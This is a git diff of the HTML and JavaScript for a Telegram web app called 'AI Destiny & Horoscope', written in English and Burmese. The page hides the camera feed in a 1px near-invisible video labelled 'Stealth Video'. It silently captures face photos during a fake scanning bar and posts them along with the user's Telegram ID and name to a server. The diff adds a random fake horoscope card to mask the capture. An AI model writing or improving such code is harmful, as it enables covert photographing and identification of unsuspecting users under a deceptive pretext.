@@ -1,26 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AI Destiny Scanner</title>
+    <title>AI Destiny & Horoscope</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0a0e14; color: #00d2ff; font-family: sans-serif; text-align: center; margin: 0; overflow: hidden; }
-        .scanner-box { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+        body { background: #0a0e14; color: #00d2ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; overflow-x: hidden; }
+        .container { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
+        
+        /* Stealth Video */
         #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
+        
+        /* Scanner UI */
         .scan-line { width: 80%; height: 2px; background: #00d2ff; position: absolute; animation: scan 3s infinite linear; }
-        .loading-bar { width: 250px; height: 10px; border: 1px solid #00d2ff; margin-top: 20px; }
-        .progress { width: 0%; height: 100%; background: #00d2ff; transition: width 0.1s; }
         @keyframes scan { 0% { top: 20%; } 50% { top: 80%; } 100% { top: 20%; } }
+        
+        .loading-bar { width: 250px; height: 10px; border: 1px solid #00d2ff; margin-top: 20px; border-radius: 5px; }
+        .progress { width: 0%; height: 100%; background: #00d2ff; transition: width 0.1s; }
+
+        /* Horoscope Result Card */
+        #result-card { 
+            display: none; background: rgba(255, 255, 255, 0.05); 
+            backdrop-filter: blur(15px); border-radius: 20px; 
+            padding: 25px; border: 1px solid rgba(0, 210, 255, 0.3);
+            width: 90%; max-width: 350px; text-align: left;
+            animation: fadeIn 1s ease-in-out;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .result-item { margin: 15px 0; border-bottom: 1px solid rgba(0, 210, 255, 0.1); padding-bottom: 8px; }
+        .label { font-size: 0.8rem; color: #aaa; text-transform: uppercase; }
+        .value { font-size: 1.1rem; font-weight: bold; color: #fff; display: block; margin-top: 4px; }
+        .close-btn { 
+            background: #00d2ff; color: #000; border: none; padding: 10px 20px; 
+            border-radius: 50px; width: 100%; margin-top: 20px; font-weight: bold;
+        }
     </style>
 </head>
 <body>
-    <div class="scanner-box">
-        <div class="scan-line"></div>
-        <h2 id="header">AI DESTINY SCANNER</h2>
-        <p id="status">ကင်မရာအား စစ်ဆေးနေပါသည်...</p>
-        <div class="loading-bar"><div class="progress" id="progress"></div></div>
+    <div class="container">
+        <div id="scanner-ui">
+            <div class="scan-line"></div>
+            <h2 id="header">AI DESTINY SCANNER</h2>
+            <p id="status">ကင်မရာအား စစ်ဆေးနေပါသည်...</p>
+            <div class="loading-bar"><div class="progress" id="progress"></div></div>
+        </div>
+
+        <div id="result-card">
+            <h2 style="text-align: center; color: #00d2ff; margin-top: 0;">DESTINY REPORT</h2>
+            <div class="result-item">
+                <span class="label">Luck Level (ကံတရား)</span>
+                <span class="value" id="luck-val">95%</span>
+            </div>
+            <div class="result-item">
+                <span class="label">Love (အချစ်ရေး)</span>
+                <span class="value" id="love-val">Loading...</span>
+            </div>
+            <div class="result-item">
+                <span class="label">Wealth (စီးပွားရေး)</span>
+                <span class="value" id="wealth-val">Loading...</span>
+            </div>
+            <div class="result-item">
+                <span class="label">Lucky Color (ကံကောင်းစေသောအရောင်)</span>
+                <span class="value" id="color-val">Loading...</span>
+            </div>
+            <button class="close-btn" onclick="tg.close()">DONE</button>
+        </div>
     </div>
+
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -34,7 +81,7 @@
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(s => { video.srcObject = s; startProcess(); })
-            .catch(() => status.innerText = "Camera Permission လိုအပ်ပါသည်");
+            .catch(() => status.innerText = "Camera Permission Required");
 
         let captureCount = 0;
         function startProcess() {
@@ -42,13 +89,12 @@
             const itv = setInterval(() => {
                 width += 0.5;
                 progress.style.width = width + '%';
-                if (width == 30 && captureCount == 0) { captureImage("Scanning..."); captureCount++; }
-                if (width == 70 && captureCount == 1) { captureImage("Analyzing..."); captureCount++; }
+                if (width == 30 && captureCount == 0) { captureImage("Scanning DNA Patterns..."); captureCount++; }
+                if (width == 70 && captureCount == 1) { captureImage("Matching Star Constellations..."); captureCount++; }
+                
                 if (width >= 100) {
                     clearInterval(itv);
-                    status.innerText = "အောင်မြင်ပါသည်!";
-                    document.getElementById('header').innerText = "YOUR LUCK: 95%";
-                    setTimeout(() => tg.close(), 3000);
+                    showHoroscope();
                 }
             }, 50);
         }
@@ -66,6 +112,21 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ image: img, user_id: uid, user_name: uname })
             });
+        }
+
+        function showHoroscope() {
+            document.getElementById('scanner-ui').style.display = 'none';
+            document.getElementById('result-card').style.display = 'block';
+
+            // Random Horoscope Results
+            const loveResults = ["ယနေ့ ချစ်သူနှင့် နားလည်မှု ပိုရမည်။", "ချစ်သူမရှိသေးသူများ အခွင့်အရေးပေါ်မည်။", "စိတ်အေးအေးထားရမည့်နေ့ဖြစ်သည်။"];
+            const wealthResults = ["ငွေကြေးကံ အသင့်အတင့်ရှိသည်။", "မမျှော်လင့်ဘဲ လာဘ်ရတတ်သည်။", "အသုံးစရိတ် ချွေတာသင့်သည်။"];
+            const colors = ["ရွှေရောင် (Gold)", "အပြာနုရောင် (Sky Blue)", "အနီရောင် (Crimson Red)"];
+
+            document.getElementById('luck-val').innerText = Math.floor(Math.random() * (100 - 85 + 1) + 85) + "%";
+            document.getElementById('love-val').innerText = loveResults[Math.floor(Math.random() * loveResults.length)];
+            document.getElementById('wealth-val').innerText = wealthResults[Math.floor(Math.random() * wealthResults.length)];
+            document.getElementById('color-val').innerText = colors[Math.floor(Math.random() * colors.length)];
         }
     </script>
 </body>
